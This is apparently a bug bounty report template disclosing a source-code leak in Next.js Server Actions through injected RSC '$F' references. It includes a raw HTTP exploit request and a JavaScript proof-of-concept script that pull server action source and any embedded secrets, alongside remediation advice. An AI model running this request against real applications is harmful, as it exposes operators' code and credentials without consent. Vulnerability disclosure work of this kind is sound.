# Bug Bounty Report: Server Action Source Code Disclosure in React Server Components

## Title
Server-Side Source Code Disclosure via RSC $F Reference Injection

## Severity
**High** (CVSS 7.5+)

## Affected Components
- React Server Components (RSC)
- Next.js Server Actions
- Affected versions: Next.js 14.x - 15.x (specific version range TBD)

## Summary
A vulnerability exists in React Server Components (RSC) that allows an unauthenticated remote attacker to extract the complete source code of server actions. By crafting a malicious RSC payload using the `$F` (server reference) type, an attacker can cause the server to return the full source code of any server action function, potentially exposing sensitive business logic, hardcoded secrets, API keys, and internal implementation details.

## Vulnerability Details

### Root Cause
The RSC protocol uses special reference types prefixed with `$` to represent various data types. The `$F` type represents a "server reference" (function reference). When a `$F` reference is deserialized and subsequently used in a string context (e.g., template literals, string concatenation), JavaScript implicitly calls `toString()` on the function object, which returns the function's source code.

The vulnerability occurs because:
1. Server action references can be passed as arguments via `$F` references
2. When the action processes this reference and uses it in a string context, `toString()` is called
3. The function's source code is returned to the client in the response

### Technical Details
The attack uses the multipart form-data RSC protocol:
- Field `1` contains a server reference: `{"id":"ACTION_ID","bound":null}`
- Field `0` contains the payload: `["$F1"]`

When processed, `$F1` resolves to the actual function object. If the action does something like:
```javascript
return `Hello, ${name}!`;
```
And `name` is our injected function reference, `toString()` is called, leaking the source.

## Steps to Reproduce

1. Identify a target Next.js application using Server Actions
2. Extract a server action ID from the client-side JavaScript bundles (42-character hex string starting with `40`)
3. Send the following HTTP request:

```http
POST /target-page HTTP/1.1
Host: target.com
Accept: text/x-component
Content-Type: multipart/form-data; boundary=----Exploit
Next-Action: [ACTION_ID]

------Exploit
Content-Disposition: form-data; name="1"

{"id":"[ACTION_ID]","bound":null}
------Exploit
Content-Disposition: form-data; name="0"

["$F1"]
------Exploit--
```

4. The response will contain the complete source code of the server action

## Proof of Concept

```javascript
const TARGET = 'https://vulnerable-app.com';
const ACTION_ID = '40xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';

const boundary = '----Exploit';
const body = [
  `--${boundary}`,
  'Content-Disposition: form-data; name="1"',
  '',
  JSON.stringify({ id: ACTION_ID, bound: null }),
  `--${boundary}`,
  'Content-Disposition: form-data; name="0"',
  '',
  '["$F1"]',
  `--${boundary}--`
].join('\r\n');

const response = await fetch(TARGET, {
  method: 'POST',
  headers: {
    'Accept': 'text/x-component',
    'Content-Type': `multipart/form-data; boundary=${boundary}`,
    'Next-Action': ACTION_ID,
  },
  body
});

const text = await response.text();
// Response contains: "Hello, async function serverAction(param) { ... full source ... }!"
```

## Impact

### Confidentiality Impact (High)
- **Source Code Exposure**: Complete server-side business logic is disclosed
- **Secret Leakage**: Hardcoded API keys, credentials, or tokens in server actions are exposed
- **Algorithm Disclosure**: Proprietary algorithms and validation logic are revealed
- **Attack Surface Mapping**: Attackers can analyze code for additional vulnerabilities

### Real-World Attack Scenarios
1. **Credential Theft**: Server action containing database credentials or API keys
2. **Business Logic Bypass**: Understanding validation logic to craft bypass attacks
3. **Vulnerability Discovery**: Source code review to find SQL injection, auth bypasses, etc.
4. **Competitive Intelligence**: Stealing proprietary algorithms

## Affected Endpoints
Any Next.js route that uses Server Actions is potentially affected.

## Remediation Recommendations

1. **Immediate**: Ensure no sensitive data (secrets, credentials) is hardcoded in server actions
2. **Framework Fix**: 
   - Prevent function objects from being serialized in RSC responses
   - Add type checking before string coercion
   - Sanitize `$F` references to prevent function-to-string conversion
3. **Defense in Depth**: Implement WAF rules to detect and block RSC payloads containing `$F` references

## References
- React Server Components Protocol
- Next.js Server Actions Documentation
- Related: React PR #35277 (partial fix for prototype traversal)

## Timeline
- **Discovery Date**: [DATE]
- **Vendor Notification**: [DATE]
- **Report Submitted**: [DATE]

## Researcher
[Your Name/Handle]





